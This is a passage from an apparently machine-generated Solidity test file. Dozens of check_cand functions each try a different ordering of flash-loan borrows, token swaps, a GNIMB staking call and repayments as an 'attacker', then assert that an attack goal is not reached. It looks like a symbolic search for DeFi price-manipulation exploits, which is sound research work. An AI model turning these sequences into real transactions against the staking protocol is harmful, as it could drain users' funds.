        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2808(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2809(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2810(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2811(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2812(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2813(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2814(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2815(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2816(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2817(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2818(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2819(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2820(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2821(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2822(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2823(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2824(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2825(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2826(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2827(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2828(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2829(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2830(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2831(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2832(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2833(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2834(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2835(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2836(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2837(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2838(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2839(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2840(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2841(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2842(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2843(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2844(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2845(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2846(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2847(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2848(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2849(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2850(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2851(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2852(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2853(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2854(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2855(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
